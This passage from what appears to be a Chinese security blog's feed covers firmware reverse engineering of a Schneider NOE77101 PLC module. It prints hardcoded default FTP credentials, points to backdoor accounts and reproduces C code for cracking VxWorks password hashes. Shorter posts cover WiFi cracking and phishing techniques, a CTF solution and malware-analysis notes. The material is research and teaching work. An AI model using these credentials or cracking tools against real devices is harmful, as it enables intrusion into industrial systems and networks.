class="line">FLASH0/wwwroot/unsecure/user/$TMP_EMPTY_DIR</span><br></pre></td></tr></table></figure></p><p><strong>fw/fw.ini文件内是固件版本，可以看到是3.60版本</strong><br><img src="https://i.loli.net/2018/07/19/5b50212aa5d39.jpg" alt="mark"></p><p><strong>wwwroot/classes/内的jar文件即是Web配置端APP文件</strong><br><img src="https://i.loli.net/2018/07/19/5b50212abff53.jpg" alt="mark"></p><p><strong>wwwroot/conf/exec/NOE77101.bin很明显就是NOE77101的固件了</strong><br><img src="https://i.loli.net/2018/07/19/5b50212adfc34.jpg" alt="mark"></p><p>那么接下来我们所要做的就是分析jar格式的APP文件，这也是此次题目所要求的，然后再研究bin文件中的其他漏洞</p><h2 id="2-Web配置APP默认账户及密码的获取"><a href="#2-Web配置APP默认账户及密码的获取" class="headerlink" title="2.Web配置APP默认账户及密码的获取"></a>2.Web配置APP默认账户及密码的获取</h2><p>针对jar包的逆向分析，常使用的工具是JD-GUI，安装该工具需要配置java环境。</p><p>打开后拖入所有jar包<br><img src="https://i.loli.net/2018/07/19/5b50212b11461.jpg" alt="mark"></p><p>发现没有加壳和混淆，于是我们直奔主题，搜索字符串PASSWORD<br><img src="https://i.loli.net/2018/07/19/5b50212b3d26f.jpg" alt="mark"></p><p>密码来的太突然了</p><blockquote><p>USER = “sysdiag”<br>PASSWORD = “factorycast@schneider”</p></blockquote><p><img src="https://i.loli.net/2018/07/19/5b50212b599c6.jpg" alt="mark"><br>可以看到是ftp连接的默认账号及密码</p><p>到这里题目所要求的就完成了</p><h2 id="3-bin固件分析"><a href="#3-bin固件分析" class="headerlink" title="3.bin固件分析"></a>3.bin固件分析</h2><h3 id="1-binwalk提取文件"><a href="#1-binwalk提取文件" class="headerlink" title="1.binwalk提取文件"></a>1.binwalk提取文件</h3><p>将NOE77101.bin在Ubuntu环境下用binwalk进行识别，显示为Zlib压缩类型<br><img src="https://i.loli.net/2018/07/19/5b50212b77c89.jpg" alt="mark"></p><p>使用<code>binwalk -e</code>命令提取文件<br><img src="https://i.loli.net/2018/07/19/5b50212b9494d.jpg" alt="mark"><br>解压后的文件217存储在_NOE77101.bin.extracted目录中，并以文件在固件升级包中的起始位置来命名。</p><p>binwalk分析217文件<br><img src="https://i.loli.net/2018/07/19/5b50212bbc928.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/19/5b5021407fa27.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/19/5b502140a5855.jpg" alt="mark"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2406504       0x24B868        VxWorks WIND kernel version &quot;2.5&quot;</span><br><span class="line">2421452       0x24F2CC        Copyright string: &quot;Copyright Wind River Systems, Inc., 1984-2000&quot;</span><br><span class="line">2435046       0x2527E6        Unix path: /host/resource/tcl/wtxerrdb.tcl</span><br><span class="line">2529396       0x269874        Copyright string: &quot;copyright_wind_river&quot;</span><br><span class="line">3232572       0x31533C        Copyright string: &quot;Copyright, Real-Time Innovations, Inc., 1991.  All rights reserved.&quot;</span><br><span class="line">3244384       0x318160        Copyright string: &quot;Copyright 1984-1996 Wind River Systems, Inc.&quot;</span><br><span class="line">3272404       0x31EED4        VxWorks symbol table, big endian, first entry: [type: function, code address: 0x223D64, symbol address: 0x2A8BC8]</span><br></pre></td></tr></table></figure><p>从最后几行看到，固件的操作系统版本是VxWorks 2.5，符号表地址也在最后给出，可以用于稍后修复函数名</p><blockquote><p>VxWorks 操作系统是美国WindRiver（风河）公司于设计开发。它以其良好的可靠性和卓越的实时性被广泛地应用在通信、军事、航空、航天等高精尖技术及实时性要求极高的领域中，如卫星通讯、军事演习、弹道制导、飞机导航等。在美国的 F-16、FA-18战斗机、B-2 隐形轰炸机和爱国者导弹上，甚至在火星登陆的探测器也都使用了VxWorks系统。最新的VxWorks7的口号是——为全球智能连接设备和系统提供动力。</p><p>由于固件特性，在普通逆向步骤上需要多三个部分</p><ol><li>修复代码函数位置</li><li>确定固件代码段基址</li><li>重构符号表</li></ol></blockquote><h3 id="2-IDA分析"><a href="#2-IDA分析" class="headerlink" title="2.IDA分析"></a>2.IDA分析</h3><h4 id="载入"><a href="#载入" class="headerlink" title="载入"></a>载入</h4><p>将217文件在IDA中分析<br>IDA加载固件后使用PPC Big-endian（PowerPC大端）处理器类型。<br><img src="https://i.loli.net/2018/07/19/5b502140c2b33.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/19/5b502140d7195.jpg" alt="mark"></p><p>载入后没有出现“由于找不到代码段起始地址从而反编译失败”的问题，应该是出题人为了降低难度，已经修复好函数位置。(如果没有修复好的话可以用Ruben的idc脚本，但现在脚本链接不能访问了 <a href="http://www.reversemode.com/images/stories/schneider/files/fix_functions_ppc.idc" target="_blank" rel="noopener">http://www.reversemode.com/images/stories/schneider/files/fix_functions_ppc.idc</a>)</p><p>载入后如下<br><img src="https://i.loli.net/2018/07/19/5b50214106755.jpg" alt="mark"></p><h4 id="确定固件的代码段基址"><a href="#确定固件的代码段基址" class="headerlink" title="确定固件的代码段基址"></a>确定固件的代码段基址</h4><p>虽然现在我们可以成功反编译，但我们还需要确定固件的代码段基址才能重构符号表<br>确定基址的思路是寻找一条相对寻址方式的lis指令。<br><img src="https://i.loli.net/2018/07/19/5b5021411a2fa.jpg" alt="mark"></p><p>在IDA中使用ALT+T直接搜lis指令，CTRL+T进行向下(上)搜索，发现在<code>00000AA0</code>处的lis指令<br><img src="https://i.loli.net/2018/07/19/5b5021412daed.jpg" alt="mark"></p><p><code>ROM:00000AA0       lis       r9, dword_358848@ha</code></p><p>观察地址后面的@ha确定基址为0x10000,这也是固件常用基址</p><p>对@h和@ha的问题，在IBM官网看到一篇文章</p><blockquote><p><a href="https://www.ibm.com/developerworks/cn/linux/hardware/ppc/assembly/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/hardware/ppc/assembly/index.html</a><br><img src="https://i.loli.net/2018/07/19/5b50214142c8e.jpg" alt="mark"></p></blockquote><p>具体也不是很懂，还有这篇</p><blockquote><p><a href="http://blog.chinaunix.net/uid-20663797-id-35772.html" target="_blank" rel="noopener">http://blog.chinaunix.net/uid-20663797-id-35772.html</a></p></blockquote><p>接下来重新载入ida，ppc模式，基址0x10000<br><img src="https://i.loli.net/2018/07/19/5b50214155d97.jpg" alt="mark"></p><p>成功反编译(和刚刚的应该没有变化)</p><p>接下来就该导入符号表了</p><h4 id="重构符号表"><a href="#重构符号表" class="headerlink" title="重构符号表"></a>重构符号表</h4><p>binwalk分析217文件时最后一行的符号表地址还记得吗？<br><img src="https://i.loli.net/2018/07/19/5b5021f2f24a9.jpg" alt="mark"></p><p>地址为<code>0x31EED4</code></p><p>使用010Editor打开217文件，搜索地址0x31EED4(ctrl+G)<br><img src="https://i.loli.net/2018/07/19/5b5021417134c.jpg" alt="mark"></p><blockquote><p>VxWorks系列的字节排序有独特的格式，以16个字节为一组数据，前4个字节是函数名的内存地址，后4个字节是函数的内存位置，然后以另4个特征字节数据+4个字节0x00结尾。</p></blockquote><p>于是符号表的起始地址是上一行的<strong><code>0x31EEC4</code></strong></p><p>一直向下查找，根据结构分析，结束地址为<strong><code>0x348114</code></strong><br><img src="https://i.loli.net/2018/07/19/5b5021f317c30.jpg" alt="mark"></p><p>接下来我们就可以编写IDPython脚本重构符号表</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">from idaapi import *</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">eaStart = 0x31eec4 </span><br><span class="line">eaEnd = 0x348114</span><br><span class="line">ea = eaStart</span><br><span class="line">while ea &lt; eaEnd:</span><br><span class="line">offset = 0</span><br><span class="line">MakeStr(Dword(ea - offset), BADADDR)</span><br><span class="line">sName = GetString(Dword(ea - offset), -1, ASCSTR_C)</span><br><span class="line">print sName</span><br><span class="line">if sName:</span><br><span class="line">eaFunc = Dword(ea - offset + 4)</span><br><span class="line">MakeName(eaFunc,sName)</span><br><span class="line">MakeCode(eaFunc)</span><br><span class="line">MakeFunction(eaFunc,BADADDR)</span><br><span class="line">ea = ea + 16</span><br><span class="line">print&quot;ok&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/07/19/5b5021f33ad49.jpg" alt="mark"></p><p>运行脚本<br><img src="https://i.loli.net/2018/07/19/5b5021f35a8ec.jpg" alt="mark"><br>修复完成</p><h4 id="固件后门账户"><a href="#固件后门账户" class="headerlink" title="固件后门账户"></a>固件后门账户</h4><p>查看usrAppInit函数，发现多个后门账户<br><img src="https://i.loli.net/2018/07/19/5b5021f37329a.jpg" alt="mark"></p><p>而密码则是经过loginDefaultEncrypt函数哈希加密<br>结合vxworks5的源码来看</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/******************************************************************************</span><br><span class="line">*</span><br><span class="line">* loginDefaultEncrypt - default password encryption routine</span><br><span class="line">*</span><br><span class="line">* This routine provides default encryption for login passwords.  It employs</span><br><span class="line">* a simple encryption algorithm.  It takes as arguments a string &lt;in&gt; and a</span><br><span class="line">* pointer to a buffer &lt;out&gt;.  The encrypted string is then stored in the</span><br><span class="line">* buffer.</span><br><span class="line">*</span><br><span class="line">* The input strings must be at least 8 characters and no more than 40</span><br><span class="line">* characters.</span><br><span class="line">*</span><br><span class="line">* If a more sophisticated encryption algorithm is needed, this routine can</span><br><span class="line">* be replaced, as long as the new encryption routine retains the same</span><br><span class="line">* declarations as the default routine.  The routine vxencrypt</span><br><span class="line">* in \f3host/&lt;hostOs&gt;/bin\fP</span><br><span class="line">* should also be replaced by a host version of &lt;encryptionRoutine&gt;.  For more</span><br><span class="line">* information, see the manual entry for loginEncryptInstall().</span><br><span class="line">*</span><br><span class="line">* RETURNS: OK, or ERROR if the password is invalid.</span><br><span class="line">*</span><br><span class="line">* SEE ALSO: loginEncryptInstall(), vxencrypt</span><br><span class="line">*</span><br><span class="line">* INTERNAL</span><br><span class="line">* The encryption is done by summing the password and multiplying it by</span><br><span class="line">* a magic number.</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">STATUS loginDefaultEncrypt</span><br><span class="line">    (</span><br><span class="line">    char *in,                           /* input string */</span><br><span class="line">    char *out                           /* encrypted string */</span><br><span class="line">    )</span><br><span class="line">    &#123;</span><br><span class="line">    int            ix;</span><br><span class="line">    unsigned long  magic     = 31695317;</span><br><span class="line">    unsigned long  passwdInt = 0;</span><br><span class="line"></span><br><span class="line">   if (strlen (in) &lt; 8 || strlen (in) &gt; 40)</span><br><span class="line">        &#123;</span><br><span class="line">errnoSet (S_loginLib_INVALID_PASSWORD);</span><br><span class="line">        return (ERROR);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    for (ix = 0; ix &lt; strlen(in); ix++)         /* sum the string */</span><br><span class="line">        passwdInt += (in[ix]) * (ix+1) ^ (ix+1);</span><br><span class="line"></span><br><span class="line">    sprintf (out, &quot;%u&quot;, (long) (passwdInt * magic)); /* convert interger</span><br><span class="line">to string */</span><br><span class="line">    /* make encrypted passwd printable */</span><br><span class="line"></span><br><span class="line">    for (ix = 0; ix &lt; strlen (out); ix++)</span><br><span class="line">        &#123;</span><br><span class="line">        if (out[ix] &lt; &apos;3&apos;)</span><br><span class="line">            out[ix] = out[ix] + &apos;!&apos;;    /* arbitrary */</span><br><span class="line"></span><br><span class="line">        if (out[ix] &lt; &apos;7&apos;)</span><br><span class="line">            out[ix] = out[ix] + &apos;/&apos;;    /* arbitrary */</span><br><span class="line"></span><br><span class="line">        if (out[ix] &lt; &apos;9&apos;)</span><br><span class="line">            out[ix] = out[ix] + &apos;B&apos;;    /* arbitrary */</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    return (OK);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/07/19/5b5021f38a71a.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/19/5b5021f39f749.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/19/5b5021f3b3958.jpg" alt="mark"></p><p>结合源码看汇编就非常清晰了</p><blockquote><p>加密过程：</p><p>1.在第一个for循环中密码字符串逐字节与位置下标相乘再按位进行异或操作，然后将每一个字符的运算结果累加起来算出passwdInt。<br>2.passwdInt值与magic相乘再转化为String类型。<br>3.字符串逐字符与’3’、’7’、’9’进行比较，加相应的值。</p><p>可以通过随机生成密码来构建一个序列化的输入密码和passwdInt的对应表，同时passwdInt与输出密码之间也可构建对应表，这样输入密码和输出密码讲通过长度有限的Int类型passwdInt打通，这样我们就能通过查表的方式由输出密码得到输入密码。相比于MD5、SHA1等加密算法，vxencrypt加密算法由于加密方式问题导致密文长度受限，以至于存在弱点。</p></blockquote><p>Rapid7 研究员HD Moore曾经发现VxWorks 5.x系统默认加密方式存在缺陷的研究文章</p><blockquote><p><a href="http://cvk.posthaven.com/how-to-crack-vxworks-password-hashes" target="_blank" rel="noopener">http://cvk.posthaven.com/how-to-crack-vxworks-password-hashes</a></p></blockquote><p>解密程序</p><blockquote><p><a href="https://github.com/cvonkleist/vxworks_hash" target="_blank" rel="noopener">https://github.com/cvonkleist/vxworks_hash</a></p></blockquote><p>这里贴上C的<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// cvk/2010-08-09</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">// password settings</span><br><span class="line">#define MIN_LENGTH 8</span><br><span class="line">#define MAX_LENGTH 40</span><br><span class="line">char *charset = &quot; !\&quot;#$%&amp;&apos;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;;</span><br><span class="line">#define CHARSET_LENGTH 95</span><br><span class="line"></span><br><span class="line">// shortcut hash table</span><br><span class="line">#define MAX_SUM 110000</span><br><span class="line">char sums[MAX_SUM][MAX_LENGTH + 1];</span><br><span class="line"></span><br><span class="line">// stage one of the hashing algorithm: the sum</span><br><span class="line">unsigned long sum(char *plaintext) &#123;</span><br><span class="line">  unsigned long s = 0;</span><br><span class="line">  int i;</span><br><span class="line">  for (i = 0; i &lt; strlen(plaintext); i++)</span><br><span class="line">    s += (plaintext[i]) * (i + 1) ^ (i + 1);</span><br><span class="line">  return s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// builds a random password</span><br><span class="line">void random_password(char *password) &#123;</span><br><span class="line">  int i;</span><br><span class="line">  int length = rand() % (MAX_LENGTH - MIN_LENGTH) + MIN_LENGTH;</span><br><span class="line">  for(i = 0; i &lt; length; i++)</span><br><span class="line">    password[i] = charset[rand() % CHARSET_LENGTH];</span><br><span class="line">  password[length] = &apos;\0&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// randomly creates checksums</span><br><span class="line">//</span><br><span class="line">// when it discovers a shorter input plaintext for a checksum that has already</span><br><span class="line">// been calculated, it replaces the existing plaintext with the new, shorter</span><br><span class="line">// one</span><br><span class="line">void brute(int runs) &#123;</span><br><span class="line">  int i;</span><br><span class="line">  char password[MAX_LENGTH + 1];</span><br><span class="line">  unsigned long s;</span><br><span class="line"></span><br><span class="line">  for(i = 0; i &lt; runs; i++) &#123;</span><br><span class="line">    random_password(password);</span><br><span class="line">    s = sum(password);</span><br><span class="line">    if(s &gt; MAX_SUM) &#123;</span><br><span class="line">      printf(&quot;error! sum too big&quot;);</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line">    if(sums[s][0] == &apos;\0&apos; || strlen(password) &lt; strlen(sums[s])) &#123;</span><br><span class="line">      strcpy(sums[s], password);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// returns the number of checksums in the table</span><br><span class="line">int count() &#123;</span><br><span class="line">  int i;</span><br><span class="line">  int c = 0;</span><br><span class="line">  for(i = 0; i &lt; MAX_SUM; i++)</span><br><span class="line">    if(sums[i][0] != &apos;\0&apos;)</span><br><span class="line">      c++;</span><br><span class="line">  return c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// prints discovered checksums</span><br><span class="line">void dump_table() &#123;</span><br><span class="line">  int i;</span><br><span class="line">  for(i = 0; i &lt; MAX_SUM; i++)</span><br><span class="line">    if(sums[i][0] != &apos;\0&apos;)</span><br><span class="line">      printf(&quot;%d\t%s\n&quot;, i, sums[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">  brute(1000000000);</span><br><span class="line">  printf(&quot;%d checksums\n&quot;, count());</span><br><span class="line">  dump_table();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此，对施耐德NOE77101的基本探究就结束了，其他漏洞还包括wireshark抓ftp包，账号密码明文显示等，就留着以后研究了，总体来说还是很有收获。</p><p>See you again！</p><p>From <a href="https://kabeor.github.io/施耐德NOE77101以太网模块固件逆向及后门挖掘/">https://kabeor.github.io/施耐德NOE77101以太网模块固件逆向及后门挖掘/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;施耐德NOE77101以太网模块固件逆向及后门挖掘&quot;&gt;&lt;a href=&quot;#施耐德NOE77101以太网模块固件逆向及后门挖掘&quot; class=&quot;headerlink&quot; title=&quot;施耐德NOE77101以太网模块固件逆向及后门挖掘&quot;&gt;&lt;/a&gt;施耐德NOE77101
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="PLC固件" scheme="https://kabeor.github.io/tags/PLC%E5%9B%BA%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>对WiFi密码安全的基础认识</title>
    <link href="https://kabeor.github.io/%E5%AF%B9WiFi%E5%AF%86%E7%A0%81%E5%AE%89%E5%85%A8%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%86/"/>
    <id>https://kabeor.github.io/对WiFi密码安全的基础认识/</id>
    <published>2018-06-23T14:08:28.541Z</published>
    <updated>2018-07-19T05:26:00.300Z</updated>
    
    <content type="html"><![CDATA[<h1 id="对WiFi密码安全的基础认识"><a href="#对WiFi密码安全的基础认识" class="headerlink" title="对WiFi密码安全的基础认识"></a>对WiFi密码安全的基础认识</h1><p>这篇文章是测试WiFi渗透和密码破解常用步骤的简单记录</p><h2 id="1-抓取握手包"><a href="#1-抓取握手包" class="headerlink" title="1. 抓取握手包"></a>1. 抓取握手包</h2><p>一般常用</p><blockquote><p>aircrack-ng<br>Fluxion <a href="https://www.jianshu.com/p/d16e86c41336" target="_blank" rel="noopener">https://www.jianshu.com/p/d16e86c41336</a><br>其他 <a href="http://www.4hou.com/tools/5584.html" target="_blank" rel="noopener">http://www.4hou.com/tools/5584.html</a></p></blockquote><p>比较有意思的是用社工思路，将用户攻击掉线，伪装登陆页面，骗取用户WiFi密码，省去了爆破的时间</p><blockquote><p>airgeddon <a href="https://www.77169.com/html/211103.html" target="_blank" rel="noopener">https://www.77169.com/html/211103.html</a></p></blockquote><h3 id="如何将用户断开AP？"><a href="#如何将用户断开AP？" class="headerlink" title="如何将用户断开AP？"></a>如何将用户断开AP？</h3><p>方式有很多，后期会渐渐补充</p><blockquote><p>Deauthentication Attack Detection（取消身份验证洪水攻击） <a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247485872&amp;idx=1&amp;sn=b1ad127f059c29cbb7aee2b2a05b1461&amp;chksm=ec1e3998db69b08e8bea181bc2edf6cc511fe40fe712b340d229c72a9508b8a9a44d19d276ec&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247485872&amp;idx=1&amp;sn=b1ad127f059c29cbb7aee2b2a05b1461&amp;chksm=ec1e3998db69b08e8bea181bc2edf6cc511fe40fe712b340d229c72a9508b8a9a44d19d276ec&amp;scene=21#wechat_redirect</a></p></blockquote><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><blockquote><p>Wifi 四次握手认证与暴力破解 <a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247487683&amp;idx=1&amp;sn=8f5ef4ed5e6d352aa7d4790b72e2436f&amp;chksm=ec1e20ebdb69a9fde2226d345531ef851b76729e92fc58a8d2efb18fd5f396b65a4c932f1437&amp;mpshare=1&amp;scene=23&amp;srcid=0623Ur6TPTgg2hrkZfZgdOeb#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247487683&amp;idx=1&amp;sn=8f5ef4ed5e6d352aa7d4790b72e2436f&amp;chksm=ec1e20ebdb69a9fde2226d345531ef851b76729e92fc58a8d2efb18fd5f396b65a4c932f1437&amp;mpshare=1&amp;scene=23&amp;srcid=0623Ur6TPTgg2hrkZfZgdOeb#rd</a></p></blockquote><p>跑字典非常考验硬件性能，和字典的有效性也密不可分<br>aircrack-ng套件中就有该功能</p><p>如果使用GPU超强的运算速度进行暴力密码破解效率就会提升很多</p><p>HashCat应该目前最好的GPU破解HASH的软件</p><blockquote><p><a href="https://www.77169.com/html/211124.html" target="_blank" rel="noopener">https://www.77169.com/html/211124.html</a></p></blockquote><p>From <a href="https://kabeor.github.io/对WiFi密码安全的基础认识/">https://kabeor.github.io/对WiFi密码安全的基础认识/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;对WiFi密码安全的基础认识&quot;&gt;&lt;a href=&quot;#对WiFi密码安全的基础认识&quot; class=&quot;headerlink&quot; title=&quot;对WiFi密码安全的基础认识&quot;&gt;&lt;/a&gt;对WiFi密码安全的基础认识&lt;/h1&gt;&lt;p&gt;这篇文章是测试WiFi渗透和密码破解常用步骤
      
    
    </summary>
    
      <category term="Web" scheme="https://kabeor.github.io/categories/Web/"/>
    
    
      <category term="WiFi安全" scheme="https://kabeor.github.io/tags/WiFi%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>看雪.京东 2018CTF helloctf</title>
    <link href="https://kabeor.github.io/%E7%9C%8B%E9%9B%AA.%E4%BA%AC%E4%B8%9C%202018CTF%20helloctf/"/>
    <id>https://kabeor.github.io/看雪.京东 2018CTF helloctf/</id>
    <published>2018-06-16T05:44:09.660Z</published>
    <updated>2018-07-19T05:25:14.486Z</updated>
    
    <content type="html"><![CDATA[<h1 id="看雪-京东-2018CTF-helloctf"><a href="#看雪-京东-2018CTF-helloctf" class="headerlink" title="看雪.京东 2018CTF helloctf"></a>看雪.京东 2018CTF helloctf</h1><p>IDA打开，<br><img src="https://i.loli.net/2018/07/19/5b5020b43dfee.jpg" alt="mark"></p><p>F5之后<br><img src="https://i.loli.net/2018/07/19/5b5020b4570af.jpg" alt="mark"></p><p>do…while循环就是核心算法<br>自己提取出来<br><img src="https://i.loli.net/2018/07/19/5b5020b47103a.jpg" alt="mark"></p><p>意思就很明显了，需要注意的就是asc_408044内是字符串%x，也就是16进制，sprintf是字符串类型格式化，很显然这里就是将输入字符串转换为16进制，strcat为将后一字符串加到前一字符串尾部，这里很显然就是32位0再加437261636b4d654a757374466f7246756e</p><p>所以我们只需要将其进行16进制转字符串即可(多个0可省略，只需补齐位数为偶数)<br><img src="https://i.loli.net/2018/07/19/5b5020b48cbe7.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/19/5b5020b4a4747.jpg" alt="mark"></p><p>From <a href="https://kabeor.github.io/看雪.京东 2018CTF helloctf/">https://kabeor.github.io/看雪.京东 2018CTF helloctf/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;看雪-京东-2018CTF-helloctf&quot;&gt;&lt;a href=&quot;#看雪-京东-2018CTF-helloctf&quot; class=&quot;headerlink&quot; title=&quot;看雪.京东 2018CTF helloctf&quot;&gt;&lt;/a&gt;看雪.京东 2018CTF helloc
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>第7章 分析恶意Windows程序</title>
    <link href="https://kabeor.github.io/%E7%AC%AC7%E7%AB%A0%20%E5%88%86%E6%9E%90%E6%81%B6%E6%84%8FWindows%E7%A8%8B%E5%BA%8F/"/>
    <id>https://kabeor.github.io/第7章 分析恶意Windows程序/</id>
    <published>2018-06-07T11:26:41.389Z</published>
    <updated>2018-07-19T05:22:29.041Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第七章-分析恶意Windows程序"><a href="#第七章-分析恶意Windows程序" class="headerlink" title="第七章 分析恶意Windows程序"></a>第七章 分析恶意Windows程序</h1><h2 id="7x1-Windows-API"><a href="#7x1-Windows-API" class="headerlink" title="7x1 Windows API"></a>7x1 Windows API</h2><h3 id="1-类型和匈牙利表达法"><a href="#1-类型和匈牙利表达法" class="headerlink" title="1. 类型和匈牙利表达法"></a>1. 类型和匈牙利表达法</h3><p>Windows总体上使用匈牙利表达法作为API函数标识符，表达式使用前缀命名模式</p><blockquote><p>Windows API常见类型<br><img src="https://i.loli.net/2018/07/19/5b5020109dc75.jpg" alt="mark"></p></blockquote><h3 id="2-句柄"><a href="#2-句柄" class="headerlink" title="2. 句柄"></a>2. 句柄</h3><p>句柄是在操作系统中被打开或被创建的项(一个窗口，进程，模块，菜单，文件等)<br>句柄不能用来做数学操作<br>我们所能做的只有保存它，并在后续函数调用中使用它来引用同一个对象</p><h3 id="3-文件系统函数"><a href="#3-文件系统函数" class="headerlink" title="3. 文件系统函数"></a>3. 文件系统函数</h3><p>恶意代码与系统交互的一个最常用的方式就是创建或修改文件<br>独特文件名或修改为既有文件名是明显的基于主机的感染迹象</p><blockquote><p>CreateFile</p></blockquote><p>用来创建和打开文件，可打开已存在的文件，管道，流，及I/O设备，能创建新文件</p><blockquote><p>ReadFile和WriteFile</p></blockquote><p>用来对文件进行读和写操作</p><blockquote><p>CreatFileMapping和MapViewOfFile</p></blockquote><p>从磁盘加载一个文件到内存和返回一个指向映射的基地址指针(可用来访问内存中的文件)</p><p><img src="https://i.loli.net/2018/07/19/5b502010b0ca7.jpg" alt="mark"></p><h3 id="4-特殊文件"><a href="#4-特殊文件" class="headerlink" title="4. 特殊文件"></a>4. 特殊文件</h3><blockquote><p>共享文件</p></blockquote><p>以\serverName\share或\?\serverName\share开头命名的特殊文件，用来访问在共享目录中的目录或文件</p><blockquote><p>通过名字空间访问的文件</p></blockquote><p>名字空间可以被认为是固定数目的文件夹，每一个文件夹中保存不同类型的对象。底层的名字空间是NT名字空间，以前缀＼开始。NT名字空间可以访问所有设备，以及所有在NT名字空间中存在的其他名字空间。</p><p>以前缀\.\开始的Win32设备名字空间，经常被恶意代码用来直接访问物理设备，并且像一个文件一样进行读写操作</p><p>使用\Device\PhysicalMemory 来直接访问物理内存，这允许用户空间程序写到内核空间中。这个技术已经被恶意代码用来修改内核，并隐藏用户空间的程序。</p><blockquote><p>备用数据流</p></blockquote><p>备用数据流(ADS）特性允许附加数据被添加到一个已存在的NTFS文件中，相当于添加一 个文件到另外一 文件中。额外数据在列一 个目录时不会被显示出来，并且当显示文件内容时也不显示；而只有在你访问流时，它才是可见的。<br>ADS数据流根据约定normalFile.txt:Stream:$DATA来命名，这允许一个程序去读写一个流。恶意代码作者喜欢ADS，因为它能被用来隐藏数据。</p><h2 id="7x2-Windows注册表"><a href="#7x2-Windows注册表" class="headerlink" title="7x2 Windows注册表"></a>7x2 Windows注册表</h2><p>Windows注册表被用来保存操作系统与程序的配置信息<br><img src="https://i.loli.net/2018/07/19/5b502010c596d.jpg" alt="mark"></p><h3 id="1-注册表根键"><a href="#1-注册表根键" class="headerlink" title="1. 注册表根键"></a>1. 注册表根键</h3><p><img src="https://i.loli.net/2018/07/19/5b502010de480.jpg" alt="mark"></p><h3 id="2-Regedit"><a href="#2-Regedit" class="headerlink" title="2. Regedit"></a>2. Regedit</h3><p>注册表编辑器，Windows内建的用来查看和编辑注册表的工具</p><h3 id="3-自启动程序"><a href="#3-自启动程序" class="headerlink" title="3. 自启动程序"></a>3. 自启动程序</h3><p>向Run子键中写入项，可设置程序自启动<br>Autoruns工具列举在操作系统启动时会自动启动运行的代码</p><h3 id="4-常用注册表函数"><a href="#4-常用注册表函数" class="headerlink" title="4. 常用注册表函数"></a>4. 常用注册表函数</h3><p><img src="https://i.loli.net/2018/07/19/5b50201101f17.jpg" alt="mark"></p><h3 id="5-练习分析注册表操作代码"><a href="#5-练习分析注册表操作代码" class="headerlink" title="5. 练习分析注册表操作代码"></a>5. 练习分析注册表操作代码</h3><h3 id="6-使用-reg文件的注册表脚本"><a href="#6-使用-reg文件的注册表脚本" class="headerlink" title="6. 使用.reg文件的注册表脚本"></a>6. 使用.reg文件的注册表脚本</h3><h2 id="7x3-网络API"><a href="#7x3-网络API" class="headerlink" title="7x3 网络API"></a>7x3 网络API</h2><h3 id="1-伯克利兼容套接字"><a href="#1-伯克利兼容套接字" class="headerlink" title="1. 伯克利兼容套接字"></a>1. 伯克利兼容套接字</h3><p>网络功能在Windows系统中由Winsock库实现，主要在ws2_32.dll中<br><img src="https://i.loli.net/2018/07/19/5b50201121de3.jpg" alt="mark"><br>WSAStartup函数必须在其他网络函数之前被调用<br>调试代码查找网络接口时，可在WSAStartup函数中设置断点</p><h3 